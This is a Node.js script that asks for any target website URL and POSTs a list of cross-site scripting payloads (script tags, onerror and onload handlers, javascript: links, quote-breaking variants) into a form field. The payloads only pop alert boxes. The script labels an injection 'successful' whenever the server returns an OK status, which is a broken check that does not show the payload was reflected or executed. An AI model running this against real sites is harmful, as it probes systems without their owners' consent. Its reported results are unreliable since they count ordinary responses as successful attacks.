const fetch = require('node-fetch');
const readline = require('readline');

// Function to test injection on input fields
async function testInputFields(websiteURL, payloads) {
    for (const payload of payloads) {
        try {
            const formData = new URLSearchParams();
            formData.append('inputField', payload);

            // Test injection using POST method
            const postResponse = await fetch(websiteURL, {
                method: 'POST',
                body: formData
            });

            if (postResponse.ok) {
                console.log(`\x1b[32mInjection successful with payload: ${payload}\x1b[0m`); // Green color for success
            } else {
                console.error(`\x1b[31mInjection failed with payload: ${payload}\x1b[0m`); // Red color for error
            }
        } catch (error) {
            console.error('\x1b[31mError:\x1b[0m', error); // Red color for error
        }
    }
}

// Function to perform the injection test
async function testInjection(websiteURL) {
    // List of payloads to inject
    const payloads = [
        '<script>alert("Injected!")</script>',
        '<img src="invalid-image" onerror="alert(\'Injected!\')">',
        '<svg/onload=alert("Injected!")>',
        '<a href="javascript:alert(\'Injected!\')">Click Me</a>',
        '"><script>alert("Injected!")</script><"',
        '"><img src="invalid-image" onerror="alert(\'Injected!\')" /><"',
        '"\'><svg/onload=alert("Injected!")>',
        '"\'><a href="javascript:alert(\'Injected!\')">Click Me</a>',
        // Add more payloads as needed
    ];

    try {
        console.log(`Testing injection on ${websiteURL} ...`);

        // Test injection on input fields
        await testInputFields(websiteURL, payloads);

        console.log('\x1b[32mInjection testing completed.\x1b[0m'); // Green color for success
    } catch (error) {
        console.error('\x1b[31mError:\x1b[0m', error); // Red color for error
    }
}

// Read user input from command line
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Ask the user to provide the target website URL
rl.question('Enter your target website URL: ', (websiteURL) => {
    // Call the function to perform the injection test with the provided website URL
    testInjection(websiteURL);
    rl.close();
});
